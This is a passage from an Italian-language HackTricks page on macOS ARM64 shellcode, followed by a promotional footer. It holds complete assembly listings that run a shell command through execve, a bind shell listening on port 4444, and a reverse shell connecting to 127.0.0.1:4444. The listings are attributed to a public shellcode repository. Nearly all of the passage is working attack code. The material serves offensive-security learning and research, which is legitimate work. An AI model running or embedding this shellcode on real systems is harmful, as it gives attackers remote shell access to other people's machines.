adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell da [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) sulla **porta 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Shell inversa

Da [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell a **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
